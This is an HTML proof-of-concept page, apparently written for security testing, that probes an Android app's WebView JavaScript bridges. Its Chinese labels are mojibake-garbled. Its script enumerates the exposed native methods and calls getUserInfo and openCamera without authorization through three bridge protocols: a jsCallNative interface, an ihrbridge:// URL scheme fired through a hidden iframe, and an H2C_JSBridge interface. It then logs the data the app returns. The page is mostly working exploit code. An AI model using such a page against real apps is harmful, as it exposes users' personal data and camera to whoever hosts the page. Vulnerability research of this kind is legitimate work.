<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JSBridge PoC v4 - Multi Protocol</title>
    <style>
        body { font-family: sans-serif; padding: 12px; background: #f5f5f5; }
        h3 { color: #333; margin-bottom: 15px; }
        .section { 
            background: white; 
            padding: 12px; 
            margin-bottom: 15px; 
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .section-title { 
            font-weight: bold; 
            color: #666; 
            margin-bottom: 10px;
            font-size: 14px;
        }
        button { 
            padding: 8px 16px; 
            margin: 4px; 
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn-pluto { background: #4CAF50; color: white; }
        .btn-irs { background: #2196F3; color: white; }
        .btn-xfb { background: #FF9800; color: white; }
        .btn-test { background: #9C27B0; color: white; }
        pre {
            border: 1px solid #ddd;
            padding: 10px;
            min-height: 150px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            background: #1e1e1e;
            color: #d4d4d4;
            font-size: 12px;
            border-radius: 4px;
        }
        .success { color: #4CAF50; }
        .error { color: #f44336; }
        .info { color: #2196F3; }
        .warn { color: #FF9800; }
    </style>
</head>
<body>
<h3>ğŸ”“ JSBridge æœªæˆæƒè®¿é—® PoC v4</h3>

<!-- ç¯å¢ƒæ£€æµ‹ -->
<div class="section">
    <div class="section-title">ğŸ“± ç¯å¢ƒæ£€æµ‹</div>
    <button class="btn-test" onclick="detectEnvironment()">æ£€æµ‹ Bridge ç¯å¢ƒ</button>
</div>

<!-- PLUTO åè®® (jsCallNative) -->
<div class="section">
    <div class="section-title">ğŸŸ¢ PLUTO åè®® - Android.jsCallNative()</div>
    <button class="btn-pluto" onclick="pluto_getUserInfo()">getUserInfo</button>
    <button class="btn-pluto" onclick="pluto_openCamera()">openCamera (é¢„æœŸå¤±è´¥)</button>
</div>

<!-- IRS åè®® (URL Scheme) -->
<div class="section">
    <div class="section-title">ğŸ”µ IRS åè®® - ihrbridge:// URL Scheme</div>
    <button class="btn-irs" onclick="irs_openCamera()">openCamera</button>
    <button class="btn-irs" onclick="irs_getUserInfo()">getUserInfo</button>
</div>

<!-- XFB åè®® (H2C_JSBridge) -->
<div class="section">
    <div class="section-title">ğŸŸ  XFB åè®® - Android.H2C_JSBridge()</div>
    <button class="btn-xfb" onclick="xfb_openCamera()">openCamera</button>
    <button class="btn-xfb" onclick="xfb_getUserInfo()">getUserInfo</button>
</div>

<!-- æ—¥å¿—åŒºåŸŸ -->
<div class="section">
    <div class="section-title">ğŸ“‹ è°ƒç”¨æ—¥å¿—</div>
    <button onclick="clearLog()" style="background:#666;color:white;font-size:12px;padding:4px 8px;">æ¸…ç©ºæ—¥å¿—</button>
    <pre id="log"></pre>
</div>

<script>
    var callbackId = 0;

    function log(msg, type) {
        var el = document.getElementById('log');
        var time = new Date().toLocaleTimeString();
        var colorClass = type || '';
        el.innerHTML += '<span class="' + colorClass + '">[' + time + '] ' + escapeHtml(msg) + '</span>\n';
        el.scrollTop = el.scrollHeight;
    }

    function escapeHtml(text) {
        var div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function clearLog() {
        document.getElementById('log').innerHTML = '';
    }

    function getCallbackId() {
        return 'cb_' + (++callbackId) + '_' + Date.now();
    }

    // ==================== é€šç”¨å›è°ƒå¤„ç† ====================
    
    // PLUTO åè®®çš„å›è°ƒï¼ˆé€šè¿‡ evaluateJavascript æ³¨å…¥ï¼‰
    window.nativeCallback = function(data) {
        log('[PLUTO å›è°ƒ] ' + JSON.stringify(data), 'success');
    };

    // IRS åè®®çš„å›è°ƒå¤„ç†ï¼ˆNative ä¼šè°ƒç”¨ IrsJSBridge.handleMessageFormNativeï¼‰
    window.IrsJSBridge = window.IrsJSBridge || {};
    window.IrsJSBridge.handleMessageFormNative = function(jsonStr) {
        log('[IRS å›è°ƒ] ' + jsonStr, 'success');
        try {
            var data = JSON.parse(jsonStr);
            log('[IRS è§£æ] code=' + data.code + ', msg=' + data.msg, 'info');
        } catch(e) {}
    };

    // XFB åè®®çš„å›è°ƒï¼ˆé€šè¿‡ $C2H_JSBridgeï¼‰
    window.$C2H_JSBridge = function(data) {
        log('[XFB å›è°ƒ] ' + JSON.stringify(data), 'success');
    };

    // ==================== ç¯å¢ƒæ£€æµ‹ ====================
    
    function detectEnvironment() {
        log('========== ç¯å¢ƒæ£€æµ‹å¼€å§‹ ==========', 'info');
        
        // æ£€æµ‹ Android bridge
        if (window.Android) {
            log('âœ… window.Android å­˜åœ¨', 'success');
            var methods = [];
            for (var k in window.Android) {
                methods.push(k);
            }
            log('   å¯ç”¨æ–¹æ³•: ' + methods.join(', '), 'info');
        } else {
            log('âŒ window.Android ä¸å­˜åœ¨', 'error');
        }

        // æ£€æµ‹ WebViewJavascriptBridge
        if (window.WebViewJavascriptBridge) {
            log('âœ… window.WebViewJavascriptBridge å­˜åœ¨', 'success');
            var methods = [];
            for (var k in window.WebViewJavascriptBridge) {
                methods.push(k);
            }
            log('   å¯ç”¨æ–¹æ³•: ' + methods.join(', '), 'info');
        } else {
            log('âŒ window.WebViewJavascriptBridge ä¸å­˜åœ¨', 'error');
        }

        // æ£€æµ‹ IrsJSBridge
        if (window.IrsJSBridge) {
            log('âœ… window.IrsJSBridge å­˜åœ¨', 'success');
        }

        log('========== ç¯å¢ƒæ£€æµ‹å®Œæˆ ==========', 'info');
    }

    // ==================== PLUTO åè®®è°ƒç”¨ ====================
    
    function pluto_getUserInfo() {
        log('--- [PLUTO] è°ƒç”¨ getUserInfo ---', 'info');
        try {
            if (!window.Android || typeof Android.jsCallNative !== 'function') {
                log('âŒ Android.jsCallNative ä¸å¯ç”¨', 'error');
                return;
            }
            var payload = { method: 'getUserInfo', data: {} };
            Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
            log('âœ… å·²è°ƒç”¨ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    function pluto_openCamera() {
        log('--- [PLUTO] è°ƒç”¨ openCamera (é¢„æœŸä¼šå¤±è´¥ï¼Œå› ä¸ºopenCameraæ˜¯IRSç±»å‹) ---', 'warn');
        try {
            if (!window.Android || typeof Android.jsCallNative !== 'function') {
                log('âŒ Android.jsCallNative ä¸å¯ç”¨', 'error');
                return;
            }
            var payload = { method: 'openCamera', data: {} };
            Android.jsCallNative(JSON.stringify(payload), 'nativeCallback');
            log('âœ… å·²è°ƒç”¨ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    // ==================== IRS åè®®è°ƒç”¨ (URL Scheme) ====================
    
    function irs_openCamera() {
        log('--- [IRS] è°ƒç”¨ openCamera (URL Scheme) ---', 'info');
        try {
            var cbId = getCallbackId();
            // æ ¼å¼: ihrbridge://callbackId/methodName?jsonParams
            var params = JSON.stringify({
                handlerName: 'openCamera',
                isOpenAlbum: false  // ç›´æ¥æ‰“å¼€ç›¸æœºï¼Œä¸æ˜¾ç¤ºé€‰æ‹©æ¡†
            });
            var url = 'ihrbridge://' + cbId + '/openCamera?' + params;
            log('URL: ' + url, 'info');
            
            // æ–¹å¼1: é€šè¿‡ iframe è§¦å‘
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(function() {
                document.body.removeChild(iframe);
            }, 100);
            
            log('âœ… URL Scheme å·²è§¦å‘ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    function irs_getUserInfo() {
        log('--- [IRS] è°ƒç”¨ getUserInfo (URL Scheme) ---', 'info');
        try {
            var cbId = getCallbackId();
            var params = JSON.stringify({ handlerName: 'getUserInfo' });
            var url = 'ihrbridge://' + cbId + '/getUserInfo?' + params;
            log('URL: ' + url, 'info');
            
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(function() {
                document.body.removeChild(iframe);
            }, 100);
            
            log('âœ… URL Scheme å·²è§¦å‘ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    // ==================== XFB åè®®è°ƒç”¨ ====================
    
    function xfb_openCamera() {
        log('--- [XFB] è°ƒç”¨ openCamera (H2C_JSBridge) ---', 'info');
        try {
            if (!window.Android || typeof Android.H2C_JSBridge !== 'function') {
                log('âŒ Android.H2C_JSBridge ä¸å¯ç”¨', 'error');
                return;
            }
            var cbId = getCallbackId();
            var payload = {
                name: 'openCamera',
                param: JSON.stringify({ isOpenAlbum: false }),
                cbID: cbId
            };
            Android.H2C_JSBridge(JSON.stringify(payload));
            log('âœ… å·²è°ƒç”¨ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    function xfb_getUserInfo() {
        log('--- [XFB] è°ƒç”¨ getUserInfo (H2C_JSBridge) ---', 'info');
        try {
            if (!window.Android || typeof Android.H2C_JSBridge !== 'function') {
                log('âŒ Android.H2C_JSBridge ä¸å¯ç”¨', 'error');
                return;
            }
            var cbId = getCallbackId();
            var payload = {
                name: 'getUserInfo',
                param: JSON.stringify({}),
                cbID: cbId
            };
            Android.H2C_JSBridge(JSON.stringify(payload));
            log('âœ… å·²è°ƒç”¨ï¼Œç­‰å¾…å›è°ƒ...', 'info');
        } catch (e) {
            log('âŒ å¼‚å¸¸: ' + e, 'error');
        }
    }

    // ==================== é¡µé¢åˆå§‹åŒ– ====================
    
    window.onload = function() {
        log('========== é¡µé¢åŠ è½½å®Œæˆ ==========', 'info');
        log('æç¤º: å…ˆç‚¹å‡»"æ£€æµ‹ Bridge ç¯å¢ƒ"æŸ¥çœ‹å¯ç”¨æ¥å£', 'warn');
        log('', '');
        log('ğŸ“‹ ä¸‰ç§åè®®è¯´æ˜:', 'info');
        log('  ğŸŸ¢ PLUTO: Android.jsCallNative() - ä»…æ”¯æŒPLUTOç±»å‹æ’ä»¶', 'info');
        log('  ğŸ”µ IRS: ihrbridge:// URL Scheme - æ”¯æŒIRSç±»å‹æ’ä»¶', 'info');
        log('  ğŸŸ  XFB: Android.H2C_JSBridge() - æ”¯æŒXFBç±»å‹æ’ä»¶', 'info');
    };
</script>
</body>
</html>
